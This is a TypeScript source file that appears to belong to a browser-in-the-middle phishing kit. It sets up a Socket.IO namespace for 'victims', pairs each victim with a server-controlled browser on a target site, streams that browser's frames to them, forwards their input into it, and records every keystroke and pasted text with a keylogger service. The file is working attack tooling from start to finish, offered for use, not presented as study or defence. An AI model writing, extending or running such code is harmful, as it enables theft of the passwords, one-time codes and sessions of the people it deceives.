import type { Namespace, Socket } from 'socket.io';
import type { SessionMetadata } from '../../../shared/types/session.js';
import type { InputEvent } from '../../../shared/types/events.js';
import { SessionManager } from '../../services/SessionManager.js';
import { BrowserPoolManager } from '../../services/BrowserPoolManager.js';
import { InputEventRouter } from '../../services/InputEventRouter.js';
import { KeyloggerService } from '../../services/KeyloggerService.js';
import { WebRTCStreamingService } from '../../services/WebRTCStreamingService.js';
import { logger } from '../../utils/logger.js';
import { config } from '../../config/config.js';

export function setupVictimNamespace(
  namespace: Namespace,
  sessionManager: SessionManager,
  browserPoolManager: BrowserPoolManager,
  inputEventRouter: InputEventRouter,
  keyloggerService: KeyloggerService,
  streamingService: WebRTCStreamingService
): void {
  namespace.on('connection', async (socket: Socket) => {
    const clientIp = socket.handshake.address;
    logger.info(`Victim connected: ${socket.id} from ${clientIp}`);

    // Handle victim connection (use custom event name to avoid conflict with socket.io 'connect')
    socket.on('victim:connect', async (data: { viewport: { width: number; height: number }; targetUrl?: string }) => {
      try {
        const metadata: SessionMetadata = {
          ip: clientIp,
          userAgent: socket.handshake.headers['user-agent'] || 'Unknown',
          viewport: data.viewport,
        };

        // Create session
        const session = await sessionManager.createSession(socket.id, metadata);

        // Get target URL from request, URL parameter, or use default from config
        const targetUrl = data.targetUrl || 
          (socket.handshake.query.targetUrl as string) || 
          config.browser.defaultTargetUrl;
        
        logger.info(`Creating browser for session ${session.id} with target URL: ${targetUrl}`);
        
        // Get or create browser for this session
        const browser = await browserPoolManager.getOrCreateBrowser(targetUrl);

        // Pair session with browser
        await sessionManager.pairWithBrowser(session.id, browser.id);
        await browserPoolManager.reserveBrowser(browser.id, session.id);

        // Set browser socket ID
        browser.socketId = socket.id;

        // Get page title from browser
        let pageTitle = '';
        try {
          pageTitle = await browser.targetPage.title();
        } catch (e) {
          logger.warn('Failed to get page title:', e);
        }

        // Emit session info to victim
        socket.emit('session:created', {
          sessionId: session.id,
          browserId: browser.id,
          title: pageTitle || undefined,
        });

        // Emit ICE servers configuration
        socket.emit('webrtc:ice-servers', {
          iceServers: config.webrtc.stunServers.map((s) => ({ urls: s.urls })),
          turnServers: config.webrtc.turnServers?.map((t) => ({
            urls: t.urls,
            username: t.username,
            credential: t.credential,
          })),
        });

        logger.info(`Session ${session.id} created and paired with browser ${browser.id}`);
        
        // Start streaming immediately (don't wait for webrtc:ready)
        // The client will signal ready, but we can start capturing frames right away
        logger.info(`Starting frame streaming from browser ${browser.id} to victim ${socket.id}`);
        
        try {
          await streamingService.startStreaming(
            browser,
            socket.id,
            (frame: Buffer) => {
              // Send frame via Socket.IO
              if (socket.connected) {
                socket.emit('frame', frame.toString('base64'));
              }
            }
          );
          logger.info(`Frame streaming started for browser ${browser.id} to victim ${socket.id}`);
        } catch (error) {
          logger.error(`Failed to start streaming for browser ${browser.id}:`, error);
        }
      } catch (error) {
        logger.error(`Error creating session for victim ${socket.id}:`, error);
        socket.emit('error', { message: 'Failed to create session' });
      }
    });

    // Handle input events
    socket.on('input', async (event: InputEvent) => {
      try {
        // Route the input event
        await inputEventRouter.routeEvent(event);

        // Log keyboard events
        if (event.type === 'keydown' || event.type === 'keyup') {
          const keyData = event.data as { key: string };
          await keyloggerService.logKey(
            event.sessionId,
            keyData.key,
            event.type === 'keydown' ? 'down' : 'up'
          );
        }

        // Log paste events
        if (event.type === 'paste') {
          const pasteData = event.data as { text: string };
          await keyloggerService.logPaste(event.sessionId, pasteData.text);
        }
      } catch (error) {
        logger.error(`Error handling input event for session ${event.sessionId}:`, error);
      }
    });

    // Handle WebRTC ready signal from victim (connection established)
    socket.on('webrtc:ready', () => {
      logger.info(`Victim ${socket.id} WebRTC connection ready`);
    });

    // Handle WebRTC offer from victim
    socket.on('webrtc:offer', async (data: { browserId: string; offer: unknown }) => {
      logger.debug(`Victim ${socket.id} sent WebRTC offer for browser ${data.browserId}`);
      // For server-side streaming, we handle this differently
    });

    // Handle WebRTC answer from victim
    socket.on('webrtc:answer', async (data: { browserId: string; answer: unknown }) => {
      logger.debug(`Victim ${socket.id} sent WebRTC answer for browser ${data.browserId}`);
      // Handle answer for peer connection
    });

    // Handle ICE candidates from victim
    socket.on('webrtc:candidate', async (data: { browserId: string; candidate: unknown }) => {
      logger.debug(`Victim ${socket.id} sent ICE candidate for browser ${data.browserId}`);
      // Handle ICE candidates for peer connection
    });

    // Handle disconnect
    socket.on('disconnect', async () => {
      logger.info(`Victim disconnected: ${socket.id}`);

      // Find session by victim socket ID
      const session = sessionManager.getSessionByVictimSocketId(socket.id);
      if (session) {
        // Stop streaming
        if (session.browserId) {
          streamingService.stopBrowserStreams(session.browserId);
          await browserPoolManager.releaseBrowser(session.browserId);
        }

        // Close keylog file
        await keyloggerService.closeKeylog(session.id);

        // Terminate session
        await sessionManager.terminateSession(session.id);
        logger.info(`Session ${session.id} terminated due to victim disconnect`);
      }
    });
  });
}
